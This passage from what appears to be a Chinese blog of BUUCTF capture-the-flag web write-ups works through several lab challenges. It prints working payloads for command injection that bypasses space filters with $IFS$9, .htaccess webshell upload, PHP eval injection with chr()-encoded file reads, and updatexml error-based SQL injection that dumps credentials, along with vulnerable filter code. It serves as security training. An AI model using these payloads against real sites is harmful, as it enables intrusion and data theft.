limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read next where c1 &gt;2 limit 1,2;</span><br><span class=\"hljs-emphasis\"> </span><br><span class=\"hljs-emphasis\">create index handler_index on handler_table(c1);</span><br><span class=\"hljs-emphasis\">handler handler_table open;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index first;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index next limit 3;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index PREV limit 3,3;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index = (3);</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &lt;= (3) limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &gt;= (3) limit 1,2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span><br><span class=\"hljs-emphasis\">handler handler_table close;</span><br><span class=\"hljs-emphasis\">drop index handler_index on handler_</span>table;<br><br></code></pre></td></tr></table></figure>\n\n<p>这里看懂以后，我自己又重新构造了一个</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-number\">1</span>&#x27;; handler `<span class=\"hljs-number\">19198109311145</span>14` open;handler `<span class=\"hljs-number\">19198109311145</span>14` read first;<br></code></pre></td></tr></table></figure>\n\n<p>效果一样，意思也差不多</p>\n<p><img src=\"/post/wp-buuctf/image-20220731224702281.png\" alt=\"image-20220731224702281\"></p>\n<h2 id=\"2-GXYCTF2019-Ping-Ping-Ping\"><a href=\"#2-GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"2.[GXYCTF2019]Ping Ping Ping\"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id=\"1-题目描述\"><a href=\"#1-题目描述\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp\"><a href=\"#2-wp\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看名字应该是道命令执行的题目</p>\n<p>先传一个IP:123.123.123.123试试</p>\n<p><code>?ip=123.123.123.123</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706231831194.png\" alt=\"image-20220706231831194\"></p>\n<p>看起来是Linux命令，先显示所有文件试试（;是顺序执行，从左往右，命令全部执行）</p>\n<p><code>?ip=123.123.123.123;ls</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706232001574.png\" alt=\"image-20220706232001574\"></p>\n<p>看到flag文件，看看能不能直接读出</p>\n<p><img src=\"/post/wp-buuctf/image-20220706232135596.png\" alt=\"image-20220706232135596\"></p>\n<p>发现，空格被过滤了，我试试了很多绕过，比如%0a，%20，%09，&lt;&gt;，但是回显都是</p>\n<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706233818795.png\" alt=\"image-20220706233818795\"></p>\n<p>意思是符号都过滤了</p>\n<p>这里引入我一个新学的空格代替符$IFS$9，这是个shell中定义的环境变量，在此处可以绕过过滤</p>\n<p>$IFS$9（$IFS是<strong>Unix</strong>系统的一个预设变量表示分隔符，$9只是当前系统shell进程的第九个参数的持有者，它始终为空字符串）</p>\n<p>试试</p>\n<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706234926216.png\" alt=\"image-20220706234926216\"></p>\n<p>发现flag也被过滤了，那就只好先看看index.php文件，试试能不能看到其代码</p>\n<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">/?ip=<br>&lt;pre&gt;/?ip=<br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>]))&#123;<br>  <span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br>  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"hljs-variable\">$ip</span>, <span class=\"hljs-variable\">$match</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"hljs-variable\">$ip</span>, <span class=\"hljs-variable\">$match</span>);<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/ /&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/bash/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class=\"hljs-variable\">$a</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&quot;ping -c 4 &quot;</span>.<span class=\"hljs-variable\">$ip</span>);<br>  <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class=\"hljs-title function_ invoke__\">print_r</span>(<span class=\"hljs-variable\">$a</span>);<br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>看到ip有很多正则匹配的字符，所以没有那么容易绕过</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\"><span class=\"hljs-keyword\">shell_exec </span>— 通过 <span class=\"hljs-keyword\">shell </span>环境执行命令，并且将完整的输出以字符串的方式返回。<br><span class=\"hljs-keyword\">shell_exec(string </span>$cmd): string<br>exec 是 <span class=\"hljs-keyword\">Shell </span>内置命令，它有两种用法，一种是执行 <span class=\"hljs-keyword\">Shell </span>命令，一种是操作文件描述符<br>ping -c <span class=\"hljs-built_in\">Count</span> 指定要被发送（或接收）的回送信号请求的数目，由 <span class=\"hljs-built_in\">Count</span> 变量指出<br>--(所以这里我们只能输入四个字符)--<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">print_r函数用于打印变量，以更容易理解的形式展示<br><br>例子<br><span class=\"hljs-meta\">&lt;?php</span> <br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">array</span> (<span class=\"hljs-string\">&#x27;a&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;apple&#x27;</span>, <span class=\"hljs-string\">&#x27;b&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;banana&#x27;</span>, <span class=\"hljs-string\">&#x27;c&#x27;</span> =&gt; <span class=\"hljs-keyword\">array</span> (<span class=\"hljs-string\">&#x27;x&#x27;</span>,<span class=\"hljs-string\">&#x27;y&#x27;</span>,<span class=\"hljs-string\">&#x27;z&#x27;</span>)); <br><span class=\"hljs-title function_ invoke__\">print_r</span> (<span class=\"hljs-variable\">$a</span>); <br><span class=\"hljs-meta\">?&gt;</span><br>输出结果<br><span class=\"hljs-title function_ invoke__\">Array</span><br>(<br>    [a] =&gt; apple<br>    [b] =&gt; banana<br>    [c] =&gt; <span class=\"hljs-title function_ invoke__\">Array</span><br>        (<br>            [<span class=\"hljs-number\">0</span>] =&gt; x<br>            [<span class=\"hljs-number\">1</span>] =&gt; y<br>            [<span class=\"hljs-number\">2</span>] =&gt; z<br>        )<br><br>)<br></code></pre></td></tr></table></figure>\n\n<p>flag过滤语句的意思判断是否按顺序出现flag</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">if</span>(<span class=\"hljs-built_in\">preg_match</span>(<span class=\"hljs-string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))<br></code></pre></td></tr></table></figure>\n\n<p>所以只要ip里的flag出现不按顺序就行，也就是flag另一种方式表示</p>\n<p>我们看源码知道有两个变量，一个是$ip,$a</p>\n<p>ip变量无法改变，变量a可以尝试赋值flag试试能不能绕过正则匹配，但是如果是a&#x3D;flag，就会顺序出现flag，匹配，所以试试a&#x3D;g，flag–&gt;fla$a</p>\n<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>\n<p>查看源码</p>\n<p>得到flag</p>\n<h2 id=\"3-MRCTF2020-你传你🐎呢\"><a href=\"#3-MRCTF2020-你传你🐎呢\" class=\"headerlink\" title=\"3.[MRCTF2020]你传你🐎呢\"></a>3.[MRCTF2020]你传你🐎呢</h2><h3 id=\"1-题目描述-1\"><a href=\"#1-题目描述-1\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-1\"><a href=\"#2-wp-1\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p> 看标题知道这是一个文件上传的题目，要求上传一个木马</p>\n<p><img src=\"/post/wp-buuctf/image-20220710111959632.png\" alt=\"image-20220710111959632\"></p>\n<p>打开先看到一个尸体在在笑，我们先试试能不能直接上传php文件</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>看来不行，那在试试能不能抓包修改前端文件后缀名，看看是不是前端验证，把php改成png，在抓包修改后缀为php</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>还是一样，还有一个猜想就是MIME验证，对content-type进行了检查，可以试试使用bp<a href=\"https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020\">抓包</a>，修改上传的PHP的content-type为image&#x2F;png，但是还是一样的</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>于是，可以用.htaccess实现图片马以php文件形式读取（如果不了解可以把.htaccess文件了解一下，把线下靶场upload-labs做一下）</p>\n<p>但是上传时，又被过滤了</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>尝试修改文件名为.htaccess.png，然后用bp抓包修改回.htaccess，上传成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114410888.png\" alt=\"image-20220710114410888\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114422488.png\" alt=\"image-20220710114422488\"></p>\n<p>然后上传图片木马</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114444539.png\" alt=\"image-20220710114444539\"></p>\n<p>把路径复制一下</p>\n<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114617412.png\" alt=\"image-20220710114617412\"></p>\n<p>蚁剑连接成功</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114647722.png\" alt=\"image-20220710114647722\"></p>\n<p>在根目录发现flag</p>\n<p>得到flag</p>\n<h2 id=\"4-RoarCTF-2019-Easy-Calc\"><a href=\"#4-RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"4.[RoarCTF 2019]Easy Calc\"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id=\"1-题目描述-2\"><a href=\"#1-题目描述-2\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-2\"><a href=\"#2-wp-2\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>还是得看大佬得wp才会</p>\n<p><a href=\"https://blog.csdn.net/weixin_44077544/article/details/102630714\">原文链接</a></p>\n<p>这是calc.php的内容，查看源码就可以看到</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><br><br><span class=\"hljs-title function_ invoke__\">error_reporting</span>(<span class=\"hljs-number\">0</span>);<br><br><span class=\"hljs-keyword\">if</span>(!<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>]))&#123;<br><br>  <span class=\"hljs-title function_ invoke__\">show_source</span>(<span class=\"hljs-keyword\">__FILE__</span>);<br><br>&#125;<span class=\"hljs-keyword\">else</span>&#123;<br><br>    <span class=\"hljs-variable\">$str</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;num&#x27;</span>];<br><br>    <span class=\"hljs-variable\">$blacklist</span> = [<span class=\"hljs-string\">&#x27; &#x27;</span>, <span class=\"hljs-string\">&#x27;\\t&#x27;</span>, <span class=\"hljs-string\">&#x27;\\r&#x27;</span>, <span class=\"hljs-string\">&#x27;\\n&#x27;</span>,<span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span>, <span class=\"hljs-string\">&#x27;&quot;&#x27;</span>, <span class=\"hljs-string\">&#x27;`&#x27;</span>, <span class=\"hljs-string\">&#x27;\\[&#x27;</span>, <span class=\"hljs-string\">&#x27;\\]&#x27;</span>,<span class=\"hljs-string\">&#x27;\\$&#x27;</span>,<span class=\"hljs-string\">&#x27;\\\\&#x27;</span>,<span class=\"hljs-string\">&#x27;\\^&#x27;</span>];<br><br>    <span class=\"hljs-keyword\">foreach</span> (<span class=\"hljs-variable\">$blacklist</span> <span class=\"hljs-keyword\">as</span> <span class=\"hljs-variable\">$blackitem</span>) &#123;<br><br>        <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&#x27;/&#x27;</span> . <span class=\"hljs-variable\">$blackitem</span> . <span class=\"hljs-string\">&#x27;/m&#x27;</span>, <span class=\"hljs-variable\">$str</span>)) &#123;<br><br>            <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;what are you want to do?&quot;</span>);<br><br>        &#125;<br><br>    &#125;<br><br>  <span class=\"hljs-keyword\">eval</span>(<span class=\"hljs-string\">&#x27;echo &#x27;</span>.<span class=\"hljs-variable\">$str</span>.<span class=\"hljs-string\">&#x27;;&#x27;</span>);<br><br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span> <br></code></pre></td></tr></table></figure>\n\n<p>waf主要就是看有没有非数字存在，绕过waf就好操作了</p>\n<hr>\n<p>1.1PHP的字符串解析特性</p>\n<p>这是别人对PHP字符串解析漏洞的理解，<br>我们知道PHP将查询字符串（在URL或正文中）转换为内部$_GET或的关联数组$_POST。</p>\n<p>例如：&#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。</p>\n<p>值得注意的是，查询字符串在解析的过程中会将某些字符删除或用下划线代替。</p>\n<p>例如，&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。</p>\n<p>如果一个IDS&#x2F;IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：</p>\n<figure class=\"highlight haxe\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs haxe\">/<span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">s</span>.php?%<span class=\"hljs-number\">20</span><span class=\"hljs-keyword\">new</span><span class=\"hljs-type\">s</span>[id%<span class=\"hljs-number\">00</span>=<span class=\"hljs-number\">42</span><span class=\"hljs-string\">&quot;+AND+1=0–</span><br></code></pre></td></tr></table></figure>\n\n<p>上述PHP语句的参数%20news[id%00的值将存储到$_GET[“news_id”]中。</p>\n<p><u><strong>PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：</strong></u></p>\n<pre><code>1.删除空白符\n\n2.将某些字符转换为下划线（包括空格）\n</code></pre>\n<p>我的理解：<br>假如waf不允许num变量传递字母：</p>\n<pre><code>http://www.xxx.com/index.php?num = aaaa   //显示非法输入的话\n</code></pre>\n<p>那么我们可以在num前加个空格：</p>\n<pre><code>http://www.xxx.com/index.php? num = aaaa\n</code></pre>\n<p>这样waf就找不到num这个变量了，因为现在的变量叫“（空格）num”，而不是“num”。</p>\n<p>但php在解析的时候，会<u>先把空格给去掉</u>，这样我们的代码还能正常运行，还上传了非法字符。</p>\n<hr>\n<p>var_dump() </p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs\">列举数组内容<br></code></pre></td></tr></table></figure>\n\n<p>scandir() 的使用：</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">scandir(<span class=\"hljs-built_in\">directory</span>,sorting_order,<span class=\"hljs-built_in\">context</span>);<br><br> 返回指定目录中的文件和目录的数组,就是显示文件夹名字<br></code></pre></td></tr></table></figure>\n\n<p>file_get_contents() 的使用：</p>\n<pre><code>原型：file_get_contents(path,include_path,context,start,max_length)\nfile_get_contents() 函数把整个文件读入一个字符串中。\n和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。\nfile_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。\n就是显示文件内容\n</code></pre>\n<hr>\n<p>chr(47)是<code>/</code>的ASCII编码；【<code>/</code>就是根目录，可以先访问一下根目录，找找大概flag在哪里】</p>\n<p>chr(102)是<code>f</code>的ASCII编码；</p>\n<p>chr(49)是<code>1</code>的ASCII编码；</p>\n<p>chr(97)是<code>a</code>的ASCII编码；</p>\n<p>chr(103)是<code>g</code>的ASCII编码。</p>\n<p>【字符间用<code>.</code>连接，如<code>flag</code>-&gt;<code>chr(102).chr(49).chr(97).chr(103)</code>】</p>\n<p>根据php解析字符串的特性</p>\n<p>先试试返回看看根目录（&#x2F;）下的文件有哪些</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?num=var_dump(scandir(chr(47)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819232248275.png\" alt=\"image-20220819232248275\"></p>\n<p>看到有个<code>flagg</code></p>\n<p>返回看看<code>/flagg</code>里的内容</p>\n<p><code>http://node4.buuoj.cn:29105/calc.php?  num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220819234552921.png\" alt=\"image-20220819234552921\"></p>\n<h2 id=\"5-极客大挑战-2019-HardSQL\"><a href=\"#5-极客大挑战-2019-HardSQL\" class=\"headerlink\" title=\"5.[极客大挑战 2019]HardSQL\"></a>5.[极客大挑战 2019]HardSQL</h2><h3 id=\"1-题目描述-3\"><a href=\"#1-题目描述-3\" class=\"headerlink\" title=\"1)题目描述\"></a>1)题目描述</h3><p>无</p>\n<h3 id=\"2-wp-3\"><a href=\"#2-wp-3\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>看名字，猜测这个sql注入过滤很严</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144626428.png\" alt=\"image-20220821144626428\"></p>\n<p>先试试fuzz测试，看看过滤了哪些，发现union被过滤，所以不能用联合注入</p>\n<p><img src=\"/post/wp-buuctf/image-20220821144002573.png\" alt=\"image-20220821144002573\"></p>\n<p>但是发现updatexml没有被过滤，所以可以试试报错注入</p>\n<p><img src=\"/post/wp-buuctf/image-20220821145036408.png\" alt=\"image-20220821145036408\"></p>\n<p>先构造payload</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\">?username=<span class=\"hljs-number\">1</span><span class=\"hljs-meta\">&amp;password=1&#x27;or updatexml(1,concat(0x7e,database(),0x7e),1)%23</span><br>【这里+被过滤了，所以这里用<span class=\"hljs-meta\">#】</span><br></code></pre></td></tr></table></figure>\n\n<p>结果发现结果又被过滤了，后面用fuzz又测试了一下，发现空格也被过滤了，用%0a和其他符号也不能替换，所以只能试试()把结果框起来试试能不能绕过</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs matlab\">?username=<span class=\"hljs-number\">1</span>&amp;password=<span class=\"hljs-number\">1</span>&#x27;or(updatexml(<span class=\"hljs-number\">1</span>,concat(<span class=\"hljs-number\">0x7e</span>,database(),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))<span class=\"hljs-comment\">%23</span><br></code></pre></td></tr></table></figure>\n\n<p>得到数据库名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821172827984.png\" alt=\"image-20220821172827984\"></p>\n<p>后面就是差不多了，但是要注意不能用空格，要用()框住对象</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(table_name))<span class=\"hljs-keyword\">from</span>(information_schema.tables)<span class=\"hljs-keyword\">where</span>(table_schema)<span class=\"hljs-keyword\">like</span>(<span class=\"hljs-string\">&#x27;geek&#x27;</span>)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br>【这里的=也被过滤了，所以用<span class=\"hljs-keyword\">like</span>替换】<br></code></pre></td></tr></table></figure>\n\n<p>得到表名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821173920231.png\" alt=\"image-20220821173920231\"></p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(column_name))<span class=\"hljs-keyword\">from</span>(information_schema.columns)<span class=\"hljs-keyword\">where</span>(table_name)<span class=\"hljs-keyword\">like</span>(<span class=\"hljs-string\">&#x27;H4rDsq1&#x27;</span>)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>得到列名</p>\n<p><img src=\"/post/wp-buuctf/image-20220821174239954.png\" alt=\"image-20220821174239954\"></p>\n<p>然后看看列里数据找找flag</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(group_concat(id,username,<span class=\"hljs-keyword\">password</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>看回显知道flag在password里，但为什么显示不全，<strong>是因为updatexml报错回显的数据限制最多32位，所以无法显示全flag</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220821174509553.png\" alt=\"image-20220821174509553\"></p>\n<p>所以可以用left和right函数进行分段显示，本来想用stustr函数，但是发现也被过滤了</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(<span class=\"hljs-keyword\">left</span>(<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-number\">30</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p>为什么这里left函数显示30个字符，因为0x7e也就是<del>也是字符，</del>已经占了两位，所以还可以显示30位</p>\n<p><img src=\"/post/wp-buuctf/image-20220821220007687.png\" alt=\"image-20220821220007687\"></p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\">?username=1&amp;password=1&#x27;or(updatexml(1,concat(0x7e,(<span class=\"hljs-keyword\">select</span>(<span class=\"hljs-keyword\">right</span>(<span class=\"hljs-keyword\">password</span>,<span class=\"hljs-number\">30</span>))<span class=\"hljs-keyword\">from</span>(H4rDsq1)),<span class=\"hljs-number\">0x7e</span>),<span class=\"hljs-number\">1</span>))%<span class=\"hljs-number\">23</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220821220041922.png\" alt=\"image-20220821220041922\"></p>\n<p>因为是左右显示30位，所以flag内容有重叠，整理一下</p>\n<p>得到flag</p>\n<figure class=\"highlight maxima\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs maxima\">flag&#123;<span class=\"hljs-number\">034eb054</span>-<span class=\"hljs-number\">83b5</span>-412c-b90e-afc72c6ce998&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"6-网鼎杯-2020-青龙组-AreUSerialz1\"><a href=\"#6-网鼎杯-2020-青龙组-AreUSerialz1\" class=\"headerlink\" title=\"6.[网鼎杯 2020 青龙组]AreUSerialz1\"></a>6.[网鼎杯 2020 